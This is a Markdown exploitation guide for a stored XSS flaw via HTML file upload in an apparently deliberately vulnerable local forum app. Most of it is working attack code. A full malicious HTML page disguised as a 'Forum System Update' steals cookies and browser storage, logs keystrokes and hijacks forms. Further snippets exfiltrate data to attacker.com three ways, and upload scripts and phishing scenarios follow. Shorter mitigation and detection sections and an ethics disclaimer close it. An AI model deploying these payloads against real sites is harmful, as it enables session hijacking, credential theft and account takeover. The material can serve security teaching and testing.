# HTML XSS Stored Cookie Vulnerability - Exploitation Guide

## Overview
This document explains how to exploit the HTML file upload vulnerability that allows for Cross-Site Scripting (XSS) attacks with cookie theft capabilities in the vulnerable forum application.

## Vulnerability Details

### **Vulnerability Type**: Stored XSS via HTML File Upload
- **Risk Level**: CRITICAL
- **CVSS Score**: 9.6 (Critical)
- **Attack Vector**: Network
- **Impact**: Complete session hijacking, data theft, account takeover

### **Root Cause**
1. **Unrestricted File Upload**: Application accepts HTML files without validation
2. **Direct File Serving**: Uploaded HTML files are served directly from `/uploads/` directory
3. **No Authentication Required**: Files accessible without login
4. **No Content Security Policy**: No CSP headers to prevent script execution
5. **Same-Origin Execution**: HTML files execute in the same domain context

## Exploitation Steps

### **Step 1: Create Malicious HTML File**

Create a file named `malicious.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Forum Update</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }
        .loading { text-align: center; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Forum System Update</h1>
        <div class="loading">
            <p>Please wait while we update your session...</p>
            <p>This page will redirect automatically.</p>
        </div>
    </div>

    <script>
        // XSS Payload - Cookie Theft and Session Hijacking
        console.log('XSS Payload Executing...');
        
        // Harvest all available data
        const harvestData = {
            // Session and authentication data
            cookies: document.cookie,
            sessionStorage: JSON.stringify(sessionStorage),
            localStorage: JSON.stringify(localStorage),
            
            // Browser and system information
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            
            // Page context
            url: window.location.href,
            referrer: document.referrer,
            title: document.title,
            
            // Timing information
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        // Display stolen data in console
        console.log('STOLEN DATA:', harvestData);
        
        // Show alert to demonstrate successful XSS
        alert('XSS SUCCESSFUL!\n\nSession Data Captured:\n' + 
              'Cookies: ' + document.cookie + '\n' +
              'URL: ' + window.location.href + '\n' +
              'User Agent: ' + navigator.userAgent);
        
        // Simulate sending data to attacker server
        console.log('Sending stolen data to attacker server...');
        
        // In a real attack, this would send data to attacker's server:
        // fetch('https://attacker.com/collect', {
        //     method: 'POST',
        //     body: JSON.stringify(harvestData)
        // });
        
        // Keylogger functionality
        let keystrokes = [];
        document.addEventListener('keypress', function(e) {
            keystrokes.push({
                key: e.key,
                timestamp: new Date().toISOString(),
                target: e.target.tagName
            });
            
            // Log every 5 keystrokes
            if (keystrokes.length % 5 === 0) {
                console.log('CAPTURED KEYSTROKES:', keystrokes.slice(-5));
            }
        });
        
        // Form hijacking
        document.addEventListener('submit', function(e) {
            const formData = new FormData(e.target);
            const formObject = {};
            formData.forEach((value, key) => {
                formObject[key] = value;
            });
            
            console.log('FORM SUBMITTED:', formObject);
            alert('Form data captured: ' + JSON.stringify(formObject));
        });
        
        // Redirect after 5 seconds to appear legitimate
        setTimeout(function() {
            window.location.href = '/';
        }, 5000);
    </script>
</body>
</html>
```

### **Step 2: Upload the Malicious HTML File**

1. **Access Upload Page**:
   ```
   http://127.0.0.1:5000/upload
   ```

2. **Login/Register** if required:
   - Username: `admin2@gmail.com`
   - Password: `password123`

3. **Upload the HTML file**:
   - Select your `malicious.html` file
   - Click "Upload File"
   - Note the success message

### **Step 3: Access the Malicious File**

The uploaded file will be accessible at:
```
http://127.0.0.1:5000/uploads/malicious.html
```

### **Step 4: Exploit Execution**

When a victim visits the malicious URL:

1. **Immediate Execution**: JavaScript runs automatically
2. **Cookie Theft**: All cookies are captured and logged
3. **Session Hijacking**: Session tokens are stolen
4. **Data Harvesting**: Browser and system info collected
5. **Keylogging**: All keystrokes are monitored
6. **Form Hijacking**: Form submissions are intercepted

## Attack Scenarios

### **Scenario 1: Direct Link Attack**
- Attacker shares the malicious URL directly
- Victim clicks and gets compromised immediately
- Session cookies are stolen for account takeover

### **Scenario 2: Forum Post Injection**
- Attacker posts the malicious URL in forum discussions
- Multiple users click and get compromised
- Mass session hijacking occurs

### **Scenario 3: Email Phishing**
- Attacker sends email with malicious link
- Appears as legitimate forum update
- Victims trust the same-domain URL

### **Scenario 4: Social Engineering**
- Attacker claims it's an "important forum update"
- Users visit thinking it's legitimate
- Credentials and sessions are compromised

## Technical Details

### **XSS Payload Components**

1. **Cookie Extraction**:
   ```javascript
   cookies: document.cookie
   ```

2. **Storage Access**:
   ```javascript
   sessionStorage: JSON.stringify(sessionStorage),
   localStorage: JSON.stringify(localStorage)
   ```

3. **Browser Fingerprinting**:
   ```javascript
   userAgent: navigator.userAgent,
   platform: navigator.platform
   ```

4. **Keylogger**:
   ```javascript
   document.addEventListener('keypress', function(e) {
       // Capture keystrokes
   });
   ```

### **Data Exfiltration Methods**

In a real attack, stolen data would be sent to attacker's server:

```javascript
// Method 1: Fetch API
fetch('https://attacker.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(harvestData)
});

// Method 2: Image beacon
new Image().src = 'https://attacker.com/collect?data=' + 
                  encodeURIComponent(JSON.stringify(harvestData));

// Method 3: Form submission
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://attacker.com/collect';
// Add form fields and submit
```

## Impact Assessment

### **Immediate Impact**
- ‚úÖ Session token theft
- ‚úÖ Cookie hijacking
- ‚úÖ Account takeover
- ‚úÖ Real-time keylogging
- ‚úÖ Form data interception

### **Extended Impact**
- üî¥ Complete account compromise
- üî¥ Access to private messages
- üî¥ Ability to post as victim
- üî¥ Access to admin functions (if admin account)
- üî¥ Lateral movement to other accounts

### **Business Impact**
- üí∞ Data breach costs
- üí∞ Reputation damage
- üí∞ Legal compliance issues
- üí∞ User trust loss
- üí∞ Potential lawsuits

## Detection Methods

### **Server-Side Detection**
```bash
# Check for suspicious HTML uploads
grep -r "<script>" uploads/
grep -r "document.cookie" uploads/
grep -r "localStorage" uploads/

# Monitor access logs for XSS patterns
tail -f access.log | grep "uploads.*\.html"
```

### **Client-Side Detection**
- Browser developer tools show console output
- Network tab shows data exfiltration attempts
- Unexpected alerts or redirects

## Mitigation Strategies

### **Immediate Fixes**
1. **File Type Validation**:
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
   ```

2. **Content-Disposition Headers**:
   ```python
   return send_file(filepath, as_attachment=True)
   ```

3. **Content Security Policy**:
   ```python
   response.headers['Content-Security-Policy'] = "default-src 'self'"
   ```

### **Long-term Solutions**
1. **Separate Upload Domain**: Host uploads on different domain
2. **File Content Scanning**: Scan for malicious content
3. **Authentication Required**: Require login for file access
4. **File Renaming**: Rename uploaded files to prevent execution
5. **Sandboxing**: Serve files in sandboxed environment

## Testing Commands

### **Upload Test**:
```bash
curl -X POST -F "file=@malicious.html" \
     -H "Cookie: session=your_session_cookie" \
     http://127.0.0.1:5000/upload
```

### **Access Test**:
```bash
curl http://127.0.0.1:5000/uploads/malicious.html
```

### **Automated Testing**:
```python
import requests

# Upload malicious file
files = {'file': open('malicious.html', 'rb')}
response = requests.post('http://127.0.0.1:5000/upload', files=files)

# Verify accessibility
response = requests.get('http://127.0.0.1:5000/uploads/malicious.html')
print("XSS payload accessible:", response.status_code == 200)
```

## Proof of Concept

### **Demo Steps**:
1. Upload `malicious.html` to the forum
2. Visit `http://127.0.0.1:5000/uploads/malicious.html`
3. Observe alert showing stolen cookie data
4. Check browser console for detailed harvested information
5. Note keylogger activation and form hijacking

### **Expected Results**:
- Alert popup showing session cookies
- Console output with harvested data
- Keystrokes logged in real-time
- Automatic redirect after 5 seconds

## Legal and Ethical Considerations

‚ö†Ô∏è **WARNING**: This vulnerability demonstration is for educational purposes only. 

- Only test on systems you own or have explicit permission to test
- Do not use this information for malicious purposes
- Report vulnerabilities responsibly through proper channels
- Comply with all applicable laws and regulations

## Conclusion

This HTML XSS vulnerability demonstrates a critical security flaw that allows complete session hijacking and data theft. The combination of unrestricted file uploads and direct file serving creates a perfect storm for XSS attacks. Immediate remediation is required to prevent exploitation in production environments. 